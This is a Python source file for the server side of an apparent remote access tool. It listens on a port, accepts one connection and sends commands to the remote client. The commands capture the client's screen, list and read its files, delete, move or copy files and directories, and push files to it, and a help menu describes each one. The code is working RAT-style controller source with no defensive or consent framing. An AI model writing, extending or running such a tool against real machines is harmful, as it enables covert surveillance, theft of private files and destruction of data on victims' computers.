import socket
import sys
import time
import base64
import shutil


server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

HEADER = 64
HOST = socket.gethostbyname(socket.gethostname())
PORT = 3221

server.bind((HOST, PORT))
print("---------------------------------\nHost : {} | PORT : {}\n---------------------------------".format(HOST, PORT))

server.listen(1)


def StartControl():
    client, address = server.accept()
    print("Connection From {}".format(address[0]))

    while True:
        try:
            command = input("Enter Command: ")
            client.send(bytes(command, "utf-8"))

            if command == "screenshot":
                Data = client.recv(100000000)

                with open("ClientScreenShot.png", "wb") as fh:
                    fh.write(base64.decodebytes(Data))

            elif command == "show":
                Files_list = client.recv(300000).decode("utf-8")
                print(Files_list)

                Continue = input("Are U Want to see Data Files?: ")

                if Continue == "Yes".lower():
                    client.send(bytes("yes", "utf-8"))
                    FileName = input("Enter File Name: ")
                    client.send(bytes(FileName, "utf-8"))

                    DataFile = client.recv(100000).decode("utf-8")
                    print(DataFile)

                elif Continue == "No".lower():
                    client.send(bytes("no", "utf-8"))
                else:
                    client.send(bytes("no", "utf-8"))

            elif command == "remove":
                FileToRemove = input("Enter Dir / File Name To Remove: ")

                client.send(bytes(FileToRemove, "utf-8"))
                msgResult = client.recv(1000).decode("utf-8")

                print(msgResult)

            elif command == "search":
                Directory = input("Enter The Path: ")

                client.send(bytes(Directory, "utf-8"))

                Files = client.recv(100000).decode("utf-8")
                print("-------------\n" + Files + "\n-------------")
                #---------------------------------------------------

            elif command == "read":
                FilePath = input("Enter The File Path To Read: ")
                client.send(bytes(FilePath, "utf-8"))

                Data = client.recv(100000).decode("utf-8")
                print(Data)

            elif command == "move":
                MoveFileSrc = input("Enter File Src: ")
                MoveFileDst = input("Enter File Dst: ")

                client.send(bytes(MoveFileSrc, "utf-8"))
                client.send(bytes(MoveFileDst, "utf-8"))

            elif command == "copy":
                CopyFileSrc = input("Enter File Src: ")
                CopyFileDst = input("Enter File Dst: ")

                client.send(bytes(CopyFileSrc, "utf-8"))
                client.send(bytes(CopyFileDst, "utf-8"))

            elif command == "make":
                try:
                    TheFilePath = input("Enter File Path: ")
                    TheFileName = input("Enter File Name: ")

                    FileMakes = open(TheFileName, "w")

                    ReadFilePath = open(TheFilePath, "r")
                    FileData = ReadFilePath.read()

                    FileMakes.write(FileData)

                    ReadFilePath.close()
                    FileMakes.close()
                    #-----------------
                    #Send The File
                    FileToSend = open(TheFileName, "rb")
                    EncodeFile = base64.b64encode(FileToSend.read())

                    client.send(bytes(TheFileName, "utf-8"))
                    client.send(bytes(EncodeFile))

                except FileNotFoundError:
                    sys.exit(0)

            elif command == "help":
                print("""
screenshot = Taking a ScreenShot
show = See All The Files In The Active Directory
remove = To Remove A File
search = To See Files & Dirs In Path
read = To Read Files With Path
move = Moving File / Dir To Another Path
copy = Copying File / Dir To Another Path
make = Making File From The Server To The Client
disconnect = Disconnect
                """)

            elif command == "disconnect":
                sys.exit(0)

        except ConnectionAbortedError:
            print("The Client IP {} Has Disconnected".format(address[0]))
            sys.exit(0)

        except ConnectionResetError:
            print("The Client IP {} Has Disconnected".format(address[0]))
            sys.exit(0)


StartControl()